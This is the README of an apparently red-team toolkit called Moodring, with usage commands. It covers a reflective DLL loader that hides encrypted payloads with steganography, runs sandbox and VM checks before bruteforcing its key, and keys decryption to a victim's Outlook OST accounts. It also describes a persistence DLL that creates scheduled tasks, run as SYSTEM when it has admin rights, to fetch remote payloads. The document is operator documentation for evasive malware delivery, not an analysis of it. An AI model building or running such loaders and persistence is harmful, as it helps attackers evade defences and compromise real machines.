## Moodring
PoC reflective DLL loader libraries with encryption, steg and env checks. Decryption key is bruteforced at runtime after env/vm checks are performed. 

### Cryptorchid - Encrypt and Hide 
Command line Encryptor/Debug tool, can test if the hash can be retrieved and payload decrypted successfully prior to putting it in the pipeline

```powershell
# Skip DNS check, use steganography, and encrypt the dll using AAAA and steg the hash into logo.png, to create logo_copy.png with the hash embeded in least signifcant bit
 .\Cryptorchid.exe -nodns -steg AAAA .\calc.dll .\Logo.png

# Check DNS match for google and check for Sandbox VMs, looks for encyrpted 'mod.txt' and png in the current dir, bruteforce to decrypt and load
# This is to test the sideloading dll, change these values in Moodring source under Program.Main().
 .\Cryptorchid.exe 8.8.8.8 -antivm -stegload .\Logo_copy.png "Calc.Modes.RunCalc.Execute"

 # Pull hash from steg image and decrypt output to view (meant for text/test, will print the contents of dlls)
 .\Cryptorchid.exe -nodns -desteg  .\Logo_copy.png

 # Get hash of UPN for OST file matching
 .\Cryptorchid.exe -nodNS -hash manager@corpomax.com

 # Store hash of UPN in least significant bit
.\Cryptorchid.exe -nodNS -hideupn balls@krebsonsecurity.com .\NOGO.png

# retrieve the hash from the image
.\Cryptorchid.exe -nodNS -getupn .\NOGO_copy.png

# List OST Files found on disk for matching on UPNs
.\Cryptorchid.exe -nodNS -listaccounts 

# Encrypt using UPN Hash so we can decrypt later based on OST files found on system
.\Cryptorchid.exe -noDNs -encryptupn email@domain.com .\logo.png

# Decrypt and invoke method, matching on UPN Hash, pull it from image and check if any OST files found in AppData match
.\Cryptorchid.exe -noDNs -decryptupn .\logo_copy.png Calc.Modes.RunCalc.Execute
```

### Moodring - Decrypts payload from encrypted text file using hash stored in image
Sideloader DLL, handles the payloads decryption and loads target into memory, invoking your desired method. 

TODO: Have this an encrypted value we can pull as well from another image, get rid of the text file.

Added matching on UPN and OST file, pulls hash from image if the expected OST file is found and decrypts payload before loading.

### Taskmasker 
Persister DLL, checks users permissions and creates a task, fetching a remote payload to an AppData directory. If admin, two tasks are created, one to run as SYSTEM. 

### Package.ps1
Can collect built DLLs or build and collect to .\Package

```powershell
.\Package.ps1

# build binaries as well
.\Package.ps1 -build
```

